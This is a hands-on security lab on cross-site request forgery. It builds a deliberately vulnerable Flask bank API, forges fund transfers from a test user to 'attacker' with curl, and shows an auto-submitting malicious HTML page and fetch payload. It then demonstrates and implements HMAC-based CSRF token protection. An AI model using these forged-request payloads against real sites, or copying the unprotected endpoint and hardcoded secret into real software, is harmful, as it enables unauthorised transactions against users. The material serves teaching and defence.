# Lab 18: Cross-Site Request Forgery (CSRF)

## Objective

Exploit and then defend against CSRF attacks in a live API from Kali Linux:

1. **CSRF forged transfer** — make a £200 fund transfer from alice's account without her knowledge or consent, using only her session token and a crafted HTTP request
2. **Demonstrate the attack model** — show how a malicious page can trigger state-changing requests cross-origin
3. **Verify CSRF token protection** — confirm that HMAC-protected endpoints reject forged requests while accepting legitimate ones
4. **Understand the defence** — implement and verify HMAC-based CSRF tokens

---

## Background

CSRF abuses the browser's automatic credential-sending behaviour. When a victim visits a malicious page, their browser automatically includes session cookies or tokens in requests to authenticated sites — enabling the attacker to perform actions as the victim.

**Real-world examples:**
- **2008 Gmail CSRF** — attackers tricked logged-in Gmail users into visiting a page that silently added an email forwarding rule to attacker@evil.com. All emails forwarded automatically until discovered.
- **2018 Coinbase** — a researcher found a CSRF on the funds transfer endpoint. With one click on a malicious link, an authenticated user would have transferred cryptocurrency to an attacker wallet.
- **2020 Shopify** — CSRF on the store admin panel allowed attackers to add admin accounts to victim stores through a single forged request.
- **WordPress < 4.7.5** — multiple CSRF vulnerabilities allowed unauthenticated attackers to change site settings, delete posts, and add admin users through malicious links sent to logged-in admins.

**OWASP coverage:** A01:2021 (Broken Access Control) — "forced browsing" variant; historically its own A8 category

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Docker Network: lab-a18                         │
│                                                                     │
│  ┌──────────────────────┐                                          │
│  │   KALI ATTACKER      │  Forged POST (no CSRF token)            │
│  │  innozverse-kali     │ ──────────────────────────────────────▶  │
│  │                      │                                          │
│  │  Simulates:          │  ◀──────── transfer result ─────────────  │
│  │  • Malicious page    │                                          │
│  │  • CSRF forged req   │  ┌────────────────────────────────────┐ │
│  │  • Legit req + token │  │    VICTIM BANK API (Lab 18)        │ │
│  └──────────────────────┘  │  zchencow/innozverse-cybersec      │ │
│                             │                                    │ │
│                             │  Flask :5000                       │ │
│                             │  POST /api/transfer (no CSRF)      │ │
│                             │  POST /api/transfer-protected      │ │
│                             │  GET  /api/csrf-token              │ │
│                             └────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
35 minutes

---

## Lab Instructions

### Step 1: Environment Setup

```bash
docker network create lab-a18

cat > /tmp/victim_a18.py << 'PYEOF'
from flask import Flask, request, jsonify
import hmac, hashlib, time

app = Flask(__name__)
SECRET = b'csrf-weak-secret'

SESSIONS = {
    'tok_alice': {'user': 'alice', 'email': 'alice@innoz.com', 'balance': 500.0},
    'tok_admin': {'user': 'admin', 'email': 'admin@innoz.com', 'balance': 9999.0},
}
TRANSFER_LOG = []

def get_csrf_token(sess_token):
    ts = str(int(time.time()) // 300)   # changes every 5 minutes
    return hmac.new(SECRET, f"{sess_token}:{ts}".encode(), hashlib.sha256).hexdigest()[:16]

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse CSRF (Lab 18)','endpoints':[
        'GET /api/user?session=X',
        'POST /api/transfer         (CSRF vulnerable)',
        'POST /api/transfer-protected (CSRF safe)',
        'GET /api/csrf-token?session=X']})

@app.route('/api/user')
def user():
    s = SESSIONS.get(request.args.get('session',''))
    if not s: return jsonify({'error':'Not logged in'}),401
    return jsonify({'user':s['user'],'email':s['email'],'balance':s['balance']})

# BUG: state-changing endpoint with no CSRF protection
@app.route('/api/transfer', methods=['POST'])
def transfer():
    d = request.get_json() or {}
    sess = SESSIONS.get(d.get('session',''))
    if not sess: return jsonify({'error':'Not logged in'}),401
    amount = float(d.get('amount', 0))
    to = d.get('to','')
    if amount <= 0: return jsonify({'error':'Invalid amount'}),400
    if sess['balance'] < amount: return jsonify({'error':'Insufficient funds'}),400
    sess['balance'] -= amount
    TRANSFER_LOG.append({'from':sess['user'],'to':to,'amount':amount,'ts':time.time()})
    return jsonify({'transferred':amount,'to':to,'remaining_balance':sess['balance'],
                    'note':'CSRF: no token checked!'})

@app.route('/api/csrf-token')
def csrf_token():
    tok = request.args.get('session','')
    if tok not in SESSIONS: return jsonify({'error':'Not logged in'}),401
    return jsonify({'csrf_token': get_csrf_token(tok), 'valid_seconds': 300})

@app.route('/api/transfer-protected', methods=['POST'])
def transfer_protected():
    d = request.get_json() or {}
    sess_tok  = d.get('session','')
    csrf_tok  = d.get('csrf_token','')
    sess = SESSIONS.get(sess_tok)
    if not sess: return jsonify({'error':'Not logged in'}),401
    expected = get_csrf_token(sess_tok)
    if not hmac.compare_digest(csrf_tok, expected):
        return jsonify({'error':'CSRF token invalid or missing — request rejected'}),403
    amount = float(d.get('amount',0))
    to     = d.get('to','')
    sess['balance'] -= amount
    TRANSFER_LOG.append({'from':sess['user'],'to':to,'amount':amount,'protected':True})
    return jsonify({'transferred':amount,'to':to,
                    'remaining_balance':sess['balance'],'csrf':'verified'})

@app.route('/api/transfers')
def transfers():
    return jsonify(TRANSFER_LOG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a18 \
  --network lab-a18 \
  -v /tmp/victim_a18.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 4
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a18.IPAddress}}' victim-a18):5000/ | python3 -m json.tool
```

---

### Step 2: Launch Kali Attacker

```bash
docker run --rm -it \
  --name kali-attacker \
  --network lab-a18 \
  zchencow/innozverse-kali:latest bash
```

```bash
export TARGET="http://victim-a18:5000"

echo "=== Alice's current balance ==="
curl -s "$TARGET/api/user?session=tok_alice" | python3 -m json.tool
```

**📸 Verified Output:**
```json
{"balance": 500.0, "email": "alice@innoz.com", "user": "alice"}
```

---

### Step 3: CSRF Forged Transfer — No Token Needed

```bash
echo "=== Attack: forge a fund transfer on alice's behalf ==="

echo "[1] Attacker sends POST directly simulating a cross-origin request:"
echo "    (In real CSRF: victim's browser does this automatically from a malicious page)"
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"session":"tok_alice","to":"attacker","amount":200}' \
  $TARGET/api/transfer | python3 -m json.tool

echo ""
echo "[2] Alice's balance after the forged transfer:"
curl -s "$TARGET/api/user?session=tok_alice"

echo ""
echo "[3] A second forged transfer:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"session":"tok_alice","to":"attacker","amount":100}' \
  $TARGET/api/transfer | python3 -c "
import sys,json; r=json.load(sys.stdin)
print(f'  transferred: £{r[\"transferred\"]}  remaining: £{r[\"remaining_balance\"]}')"

echo ""
echo "=== Transfer log — shows attacker's activity ==="
curl -s $TARGET/api/transfers | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "note": "CSRF: no token checked!",
    "remaining_balance": 300.0,
    "to": "attacker",
    "transferred": 200.0
}

Alice balance: {"balance": 200.0, ...}

Transfer log:
[
    {"amount": 200.0, "from": "alice", "to": "attacker", "ts": 1772609942.46},
    {"amount": 100.0, "from": "alice", "to": "attacker", "ts": 1772609943.12}
]
```

> 💡 **CSRF works because the server only checks whether the session token is valid — not whether the request was intentionally made by the user.** The session token `tok_alice` is something any page can send if Alice's browser has it stored (cookie, localStorage). A malicious page loads, automatically sends the POST with Alice's session token, and the transfer happens. The user sees nothing.

---

### Step 4: Simulate the Malicious HTML Page

```bash
echo "=== What the attacker's malicious HTML page looks like ==="

cat << 'HTML'
<!-- attacker.com/evil.html — loaded in victim's browser -->
<html>
<body onload="document.csrf_form.submit()">
  <h1>You won a prize! Claiming...</h1>

  <!-- This form auto-submits when the page loads -->
  <form name="csrf_form"
        action="http://innozverse-shop.com/api/transfer"
        method="POST">
    <input type="hidden" name="session"  value="tok_alice">
    <input type="hidden" name="to"       value="attacker">
    <input type="hidden" name="amount"   value="300">
  </form>

  <!-- OR for JSON APIs — same effect via fetch/XHR -->
  <script>
    fetch('http://innozverse-shop.com/api/transfer', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      credentials: 'include',   // sends session cookies automatically
      body: JSON.stringify({to:'attacker', amount:300})
    });
  </script>
</body>
</html>
HTML

echo ""
echo "When Alice visits this page while logged in:"
echo "  1. Browser sends POST with Alice's session cookie automatically"
echo "  2. Server sees valid session token — accepts request"
echo "  3. £300 transferred to attacker"
echo "  4. Alice has no idea (page just shows 'You won a prize!')"
```

---

### Step 5: CSRF Token Protection — Acquire Token

```bash
echo "=== Defence: CSRF token protects the transfer endpoint ==="

echo "[1] Alice's page fetches a CSRF token (same-origin only — cross-origin blocked by CORS):"
CSRF_TOKEN=$(curl -s "$TARGET/api/csrf-token?session=tok_alice" | python3 -c "
import sys,json; print(json.load(sys.stdin)['csrf_token'])")
echo "  CSRF token: $CSRF_TOKEN"

echo ""
echo "[2] Legitimate transfer (alice's own page, has the token):"
curl -s -X POST -H "Content-Type: application/json" \
  -d "{\"session\":\"tok_alice\",\"csrf_token\":\"$CSRF_TOKEN\",\"to\":\"bob\",\"amount\":50}" \
  $TARGET/api/transfer-protected | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "csrf": "verified",
    "remaining_balance": 150.0,
    "to": "bob",
    "transferred": 50.0
}
```

---

### Step 6: CSRF Token Blocks Forged Requests

```bash
echo "=== Attacker cannot forge the CSRF token ==="

echo "[1] No CSRF token provided — rejected:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"session":"tok_alice","to":"attacker","amount":150}' \
  $TARGET/api/transfer-protected

echo ""
echo "[2] Wrong CSRF token — rejected:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"session":"tok_alice","csrf_token":"deadbeef","to":"attacker","amount":150}' \
  $TARGET/api/transfer-protected

echo ""
echo "[3] Cannot get the token cross-origin:"
echo "    Browser enforces SOP (Same-Origin Policy):"
echo "    fetch('http://innozverse-shop.com/api/csrf-token?session=tok_alice')"
echo "    → fails with CORS error unless server explicitly allows it"
echo "    → attacker's page cannot read alice's CSRF token"
echo "    → forged request is always rejected"

echo ""
echo "=== Why HMAC makes the token unforgeable ==="
python3 << 'EOF'
import hmac, hashlib, time

SECRET = b'csrf-weak-secret'

sess_token = 'tok_alice'
ts_window  = str(int(time.time()) // 300)

# Server generates: HMAC-SHA256(secret, session_token:ts_window)[:16]
token = hmac.new(SECRET, f"{sess_token}:{ts_window}".encode(), hashlib.sha256).hexdigest()[:16]
print(f"Valid CSRF token: {token}")
print()
print("Why attacker can't forge it:")
print("  1. Token = HMAC(SECRET, session:ts_window)")
print("  2. Attacker doesn't know SECRET (server-side only)")
print("  3. Even if attacker knows session token, HMAC requires SECRET")
print("  4. HMAC is irreversible — can't derive SECRET from output")
print("  5. Token rotates every 5 minutes — stolen token expires quickly")
EOF
```

**📸 Verified Output:**
```
[1] {"error": "CSRF token invalid or missing — request rejected"}
[2] {"error": "CSRF token invalid or missing — request rejected"}

Valid CSRF token: 03348a19c56916b9
Why attacker can't forge it:
  1. Token = HMAC(SECRET, session:ts_window)
  2. Attacker doesn't know SECRET
  3. Even if attacker knows session token, HMAC requires SECRET
  4. HMAC is irreversible
  5. Token rotates every 5 minutes
```

---

### Step 7: Transfer Log — Before and After

```bash
echo "=== Final transfer log ==="
curl -s $TARGET/api/transfers | python3 -c "
import sys, json, datetime
for t in json.load(sys.stdin):
    ts = datetime.datetime.fromtimestamp(t.get('ts',0)).strftime('%H:%M:%S') if t.get('ts') else 'N/A'
    protected = '✓ CSRF token verified' if t.get('protected') else '✗ No CSRF check'
    print(f'  {ts}  {t[\"from\"]} → {t[\"to\"]}  £{t[\"amount\"]}  {protected}')"
```

**📸 Verified Output:**
```
  07:38:42  alice → attacker  £200.0  ✗ No CSRF check
  07:38:43  alice → attacker  £100.0  ✗ No CSRF check
  07:38:50  alice → bob       £50.0   ✓ CSRF token verified
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a18
docker network rm lab-a18
```

---

## Remediation

```python
import hmac, hashlib, secrets, time
from functools import wraps

CSRF_SECRET = secrets.token_bytes(32)   # generated once at startup

def generate_csrf_token(session_id: str) -> str:
    """Generate a per-session, time-windowed HMAC CSRF token."""
    window = str(int(time.time()) // 300)   # 5-minute window
    msg = f"{session_id}:{window}".encode()
    return hmac.new(CSRF_SECRET, msg, hashlib.sha256).hexdigest()

def require_csrf(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        session_id = get_current_session_id()   # from your auth layer
        client_token = (
            request.headers.get('X-CSRF-Token') or
            (request.get_json() or {}).get('csrf_token', '')
        )
        expected = generate_csrf_token(session_id)
        if not hmac.compare_digest(client_token, expected):
            return jsonify({'error': 'CSRF validation failed'}), 403
        return f(*args, **kwargs)
    return wrapper

@app.route('/api/transfer', methods=['POST'])
@require_csrf
def transfer():
    ...
```

| Defence | What it prevents |
|---------|-----------------|
| CSRF token (HMAC, per-session) | Cross-origin forged requests |
| `SameSite=Strict` cookies | CSRF via cookie auth (browser-level) |
| `Origin` / `Referer` header check | Simple CSRF without tokens |
| Double-submit cookie pattern | Stateless CSRF protection |
| Re-authentication for sensitive actions | Even if CSRF succeeds, high-value actions require password |

## Further Reading
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger CSRF Labs](https://portswigger.net/web-security/csrf)
- [2008 Gmail CSRF case study](https://gmail.googleblog.com/2008/06/security-update.html)
